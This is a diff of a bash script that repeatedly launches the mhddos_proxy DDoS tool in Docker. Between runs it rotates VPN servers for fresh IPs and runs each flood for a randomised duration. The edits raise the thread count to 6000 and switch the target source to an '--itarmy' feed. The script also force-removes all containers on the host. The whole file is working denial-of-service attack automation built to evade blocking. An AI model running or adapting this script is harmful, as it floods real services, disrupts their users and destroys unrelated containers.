@@ -3,9 +3,9 @@
 
 #Defining some general variables
 #duration="15m" #This is now randomly chosen as well
-threads_count="-t 4000"
-targets_source="-c https://raw.githubusercontent.com/uawarrior/project1/main/trgts0.txt"
-more_params="-p 1200 --vpn --debug --http-methods GET STRESS"
+threads_count="-t 6000"
+#targets_source="-c https://raw.githubusercontent.com/uawarrior/project1/main/trgts0.txt"
+more_params="--itarmy --vpn --debug --http-methods GET STRESS" #removed: -p 1200
 
 echo -e "[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - Start: Removing any existing docker containers"
 docker rm -f $(docker ps -a -q)
@@ -32,7 +32,7 @@ do
 		if [[ "$check" == "VPN connection established." ]]; then
 			duration="$(shuf -i 12-18 -n 1)m"
 			echo -e "[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - Success: Connection to $serv is established, new IP is $newip, starting the execution for $duration"
-			docker run --rm ghcr.io/porthole-ascend-cinnamon/mhddos_proxy:latest $targets_source $threads_count $more_params &> /home/admuser/daemon-prep/mhd.log &
+			docker run --rm ghcr.io/porthole-ascend-cinnamon/mhddos_proxy:latest $threads_count $more_params &> /home/admuser/daemon-prep/mhd.log &
 			sleep $duration
 			echo -e "[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - Running: Stopping the execution and removing the container"
 			docker rm -f $(docker ps -a -q)
@@ -43,5 +43,7 @@ do
 			echo -e "[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - Fail: Error happened while connecting to vpn, retrying with another server in 30 seconds"
 			sleep 30s
 		fi
+		#Cleaning docker's cache to avoid disk space leaks
+		docker container prune -f && docker image prune -f
 	done
 done
